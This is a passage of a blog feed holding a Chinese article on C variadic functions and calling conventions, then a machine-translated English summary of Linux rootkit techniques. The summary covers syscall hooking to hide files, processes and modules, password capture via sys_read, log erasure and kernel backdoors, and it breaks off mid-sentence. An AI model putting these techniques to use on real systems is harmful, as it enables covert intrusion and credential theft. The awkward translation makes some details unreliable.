class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;109&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;110&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;111&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;112&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;113&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;114&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;115&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;C语言中有一种很奇怪的参数“…”，它主要用在引数（argument）个数不定的函&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;数中，最常见的就是&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;函数。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(“Enjoy yourself everyday!\n”); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(“The value is %d!\n”, value); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;…… &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;你想过它是怎么实现的吗？ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1. &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;为什么叫&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;？ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;不管是看什么，我总是一个喜欢刨根问底的人，对事物的源有一种特殊的癖好，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;一段典故，一个成语，一句行话，我最喜欢的就是找到它的来历，和当时的意境，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;一个外文翻译过来的术语，最低要求我会尽力去找到它原本的外文术语。特别是&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;一个字的命名来历，我一向是非常在意的，中国有句古话：“名不正，则言不顺&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;。 ”&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;中的f就是format的意思，即按格式打印【注10】。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注10：其实还有很多函数，很多变量，很多命名在各种语言中都是非常讲究的，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;你如果细心观察追溯，一定有很多乐趣和满足，比如哈希表为什么叫hashtable&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;而不叫hashlist？在C++的SGI STL实现中有一个专门用于递增的函数iota（不&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;是itoa），为什么叫这个奇怪的名字，你想过吗？ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;看文章我不喜欢意犹未尽，己所不欲，勿施于人，所以我把这两个答案告诉你： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;（1）table与list做为表讲的区别： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;table: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-------|--------------------|------- &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;item1 | kadkglasgaldfgl | jkdsfh &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-------|--------------------|------- &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;item2 | kjdszhahlka | xcvz &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-------|--------------------|------- &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;list: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;**** &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*** &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;******* &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;***** &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;That&lt;span class=&quot;string&quot;&gt;&#39;s the difference！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;如果你还是不明白，可以去看一下hash是如何实现的！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;（2）The name iota is taken from the programming language APL. &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;而APL语言主要是做数学计算的，在数学中有很多公式会借用希腊字母， &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;希腊字母表中有这样一个字母，大写为Ι，小写为ι， &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;它的英文拼写正好是iota，这个字母在θ(theta)和κ(kappa)之间！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;下面有一段是这样的: &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;APL is renowned for using a set of non-ASCII symbols that are an extension&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt; of traditional arithmetic and algebraic notation. These cryptic symbols,&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt; some have joked, make it possible to construct an entire air traffic &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;control system in two lines of code. Because of its condensed nature &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;and non-standard characters, APL has sometimes been termed a&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt; &quot;write-only language&quot;, and reading an APL program can feel like decoding&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt; an alien tongue. Because of the unusual character-set, many programmers &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;used special APL keyboards in the production of APL code. Nowadays there &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;are various ways to write APL code using only ASCII characters. &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;在C++中有函数重载（overload）可以用来区别不同函数参数的调用，但它还是不能&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;表示任意数量的函数参数。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;在标准C语言中定义了一个头文件专门用来对付可变参数列表，它包含了一组宏&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;，和一个va_list的typedef声明。一个典型实现如下【注11】： &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;typedef char* va_list; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#define va_start(list) list = (char*)&amp;amp;va_alist &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#define va_end(list) &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#define va_arg(list, mode) &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;((mode*) (list += sizeof(mode)))[-1] &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;注11：你可以查看C99标准7.15节获得详细而权威的说明。也可以参考&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;《C陷阱与缺陷》的附录A。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;ANSI C还提供了vprintf函数，它和对应的printf函数行为方式上完全相同，只&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;不过用va_list替换了格式字符串后的参数序列。至于它是如何实现的，你在认&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;真读完《The C Programming Language》后，我相信你一定可以do it yourself！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;使用这些工具，我们就可以实现自己的可变参数函数，比如实现一个系统化的错&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;误处理函数error。它和printf函数的使用差不多。只不过将stream重新定向到&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;stderr。在这里我借鉴了《C陷阱与缺陷》的附录A的例子。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;实现如下： &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#include &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#include &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;void error(char* format, …) &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;va_list ap; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;va_start(ap, format); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;fprintf(stderr, “error: “); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;vfprintf(stderr, format, ap); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;va_end(ap); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;fprintf(stderr, “\n”); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;exit(1); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#125; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;你还可以自己实现printf： &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#include &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;int printf(char* format, …) &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;va_list ap; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;va_start(ap, format); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;int n = vprintf(format, ap); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;va_end(ap); &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;return n; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#125; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;我还专门找到了VC7.1的头文件看了一下，发现各个宏的具体实现还是有区别的，&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;跟很多预处理（preprocessor）相关。其中va_list就不一定是char*的别名。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;typedef struct &amp;#123; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;char *a0; /* pointer to first homed integer argument */ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;int offset; /* byte offset of next parameter */ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#125; va_list; &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;其它的定义类似。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;经常在Windows进行系统编程的人一定知道函数调用有好几种不同的形式&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;，比如__stdcall，__pascal，__cdecl。在Windows下_stdcall，__pascal&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;是一样的，所以我只说一下__stdcall和__cdecl的区别。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;（1）__stdcall表示被调用端自身负责函数引数的压栈和出栈。函数参数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;个数一定的函数都是这种调用形式。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;例如：int fun(char c, double d)，我们在main函数中使用它，这个函数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;就只管本身函数体的运行，参数怎么来的，怎么去的，它一概不管。自然&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;有main负责。不过，不同的编译器的实现可能将参数从右向左压栈，也可&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;能从左向右压栈，这个顺序我们是不能加于利用的【注12】。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;注12：你可以在Herb Sutter的《More Exceptional C++》中的条款20：&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;An Unmanaged Pointer Problem, Part 1:Parameter Evaluation找到相&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;关的细节论述。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;（2）__cdecl表示调用端负责被调用端引数的压栈和出栈。参数可变的&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;函数采用的是这种调用形式。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;为什么这种函数要采用不同于前面的调用形式呢？那是因为__stdcall&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;调用形式对它没有作用，被调用端根本就无法知道调用端的引数个数，它&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;怎么可能正确工作？所以这种调用方式是必须的，不过由于参数参数可变的&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;函数本身不多，所以用的地方比较少。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;对于这两种方式，你可以编制一些简单的程序，然后反汇编，在汇编代码下面&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;你就可以看到实际的区别，很好理解的！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;重载函数有很多匹配（match）规则调用。参数为“…”的函数是匹配最低的&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;，这一点在Andrei Alexandrescu的惊才绝艳之作《Modern C++ Design》中就&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;有用到，参看编译期间侦测可转换性和继承性”。&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参考自: &lt;a href=&quot;http://hi.baidu.com/qq421681423/blog/item/0c7292ec533bd0d62e2e2105.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;click here&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Rootkid Summary</title>
    <link href="http://yoursite.com/2017/10/06/new%209/"/>
    <id>http://yoursite.com/2017/10/06/new 9/</id>
    <published>2017-10-06T15:15:11.335Z</published>
    <updated>2017-10-13T15:51:29.780Z</updated>
    
    <content type="html"><![CDATA[<p>Intermittent learning process do not understand slowly learn a lot, although for Rootkid it is only worth mentioning the fur content but for me still do not know progress, after all, many things can not be achieved overnight, Only after stepping on a variety of pit you will slowly comprehend some things, and later summed up some truth (only for me), learning is a gradual process, can not be the slightest irritability, if you are anxious, then You have lost from the beginning, you just started learning the process, will certainly run into a wall, which is beyond doubt, and you need to do is ask more experienced seniors or teachers, which will make you less Take a lot of detours!</p><h2 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h2><h3 id="Rootkit’s-main-categories"><a href="#Rootkit’s-main-categories" class="headerlink" title="Rootkit’s main categories:"></a>Rootkit’s main categories:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Application level -&gt; Kernel level -&gt; Hardware level</div><div class="line">Early rootkit mainly <span class="keyword">for</span> the application-level rootkit, application-level rootkit mainly by replacing the login, ps, ls, netstat and other system tools, or modify. Rhosts and other system configuration files to achieve hidden and backdoor; hardware rootkit mainly refers to bios rootkit, Before the system gets control, by writing to the disk file, and <span class="keyword">then</span> by the bootloader to load the file to regain control, you can also use the virtual machine technology, so that the entire operating system running <span class="keyword">in</span> the rootkit grasp; the most common rootkit Is kernel-level rootkit.</div><div class="line">Kernel-level rootkit can be divided into lkm rootkit, non-lkm rootkit. lkm rootkit is based on lkm technology, through the interface provided by the system to load into the kernel space, as part of the kernel, and <span class="keyword">then</span> through the hook system calls and other technologies to achieve hidden, backdoor <span class="keyword">function</span>. Non-lkm rootkit mainly refers to the system does not support the lkm mechanism to modify the kernel of a method, mainly through / dev / mem, / dev / kmem equipment directly to the memory, so that the kernel to modify.</div><div class="line">Non-lkm rootkit To achieve the kernel changes, the first need to get kernel space memory, it is necessary to call kmalloc allocation of memory, and kmalloc is the kernel space call, can not directly call the user space <span class="keyword">in</span> the <span class="keyword">function</span>, so think of the call through int 0x80 Function of the method. First select an unusual system call number, find the item <span class="keyword">in</span> sys_call_table, by writing / dev / mem directly modify it to kmalloc <span class="keyword">function</span> address, so that when we call the user space <span class="keyword">in</span> the user space, you can int 0x80 Into the kernel space, the implementation of kmalloc <span class="keyword">function</span> to allocate memory, and the allocation of the memory address from the eax register to <span class="built_in">return</span>, so we get a kernel address space memory, and <span class="keyword">then</span> the <span class="keyword">function</span> will be written to the memory hack, and again modify the system call table , You can achieve hook <span class="keyword">function</span> call <span class="keyword">function</span></div></pre></td></tr></table></figure><h3 id="Common-features-of-rootkit"><a href="#Common-features-of-rootkit" class="headerlink" title="Common features of rootkit:"></a>Common features of rootkit:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Hidden files: through strace ls can be found ls <span class="built_in">command</span> is through sys_getdents64 get the file directory, so you can modify the sys_getdents64 system call or the bottom of the readdir to achieve hidden files and directories, as well as ext2 file system directly to modify the method, but It is not easy to implement, there are some specific restrictions.</div><div class="line"></div><div class="line">Hidden process: hidden process and hidden files similar to the ps <span class="built_in">command</span> is to <span class="built_in">read</span> / proc file system under the process directory to obtain process information, as long as you can hide the / proc file system under the process directory can achieve the effect of hidden process, Ie hook sys_getdents64 and readdir.</div><div class="line"></div><div class="line">Hide the connection: netstat <span class="built_in">command</span> is by reading / proc file system under the net / tcp and net / udp file to obtain the current connection information, so you can hook sys_read call to achieve a hidden connection, you can modify tcp4_seq_show and udp4_seq_show and other <span class="built_in">functions</span>.</div><div class="line"></div><div class="line">Hide the module: lsmod <span class="built_in">command</span> is mainly through the sys_query_module system call to obtain the module information, you can call the hook sys_query_module system to hide the module, you can also remove the module from the kernel module list to achieve the hidden effect.</div><div class="line"></div><div class="line">Sniffer: sniffer can directly access library libpcap link layer, intercepted data packets, packets may be intercepted at the point of hook by the IP layer of linux netfilter framework. Sniffer to obtain other data packets on the network need to <span class="built_in">set</span> the network card to the promiscuous mode, <span class="built_in">which</span> is through the ioctl system call SIOCSIFFLAGS order to see the current mode of the network card is through the SIOCGIFFLAGS order, so you can hide the network through the hook sys_ioctl mixed mode.</div><div class="line"></div><div class="line">Record password: password records can be achieved by hook sys_read call system, such as through a process to determine the name of the currently running the current terminal is closed or <span class="built_in">echo</span>, the user can obtain the password. hook sys_read can also implement other <span class="built_in">functions</span> such as login back door.</div><div class="line"></div><div class="line">Erase <span class="built_in">log</span>: <span class="built_in">log</span> traditional unix predominantly at / var / <span class="built_in">log</span> / messages, / var / <span class="built_in">log</span> / lastlog, / var / run / utmp, / var / <span class="built_in">log</span> / wtmp, can be prepared by appropriate modification tool <span class="built_in">log</span> file , You can also change the environment such as HISTFILE / dev / null to hide some of the user<span class="string">'s operating information.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Core back door: can be the local backdoor and the network to monitor the back door, the local right to mention the kernel module can be sent through the custom command to achieve, the network kernel back door can be in the IP layer to enter the host data packet monitoring, found matching designation After the packet immediately start the connection process.</span></div></pre></td></tr></table></figure><h3 id="Rootkit’s-main-technology"><a href="#Rootkit’s-main-technology" class="headerlink" title="Rootkit’s main technology:"></a>Rootkit’s main technology:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">lkm injection, module removal, interruption interrupt (0x80, 0x01), hijacking system call, run-time patch, inline hook, port bounce ...</div><div class="line"></div><div class="line">lkm injection: is also a way to hide the kernel module, through the infection system lkm, without affecting the original <span class="keyword">function</span> of the rootkit module will be linked to the system lkm, the module is running control, after the call system lkm Initialization <span class="keyword">function</span>, lkm injection involves elf file format and module loading mechanism.</div><div class="line"></div><div class="line">Module removal: mainly refers to the module from the module list to remove the module to hide the method, the latest module is always loaded <span class="keyword">in</span> the module list header, so you can load the rootkit module and <span class="keyword">then</span> load a cleanup module will rootkit module information from Delete the list, and <span class="keyword">then</span> <span class="built_in">exit</span> the module, the new version of the kernel can also determine the module information directly after the list_del.</div><div class="line"></div><div class="line">Interception interruption: mainly through the sidt instruction to obtain the address of the interrupt call table, and <span class="keyword">then</span> access to the interrupt handler entry address, modify the corresponding interrupt handler, such as int 0x80, int 0x1 and so on. Which intercept int 0x1 is a relatively new technology, the main use of the system debugging mechanism, by setting the DR register to intercept the memory address up and down the breakpoint, <span class="built_in">which</span> <span class="keyword">in</span> the implementation of the specified instruction into the 0x1 interrupt 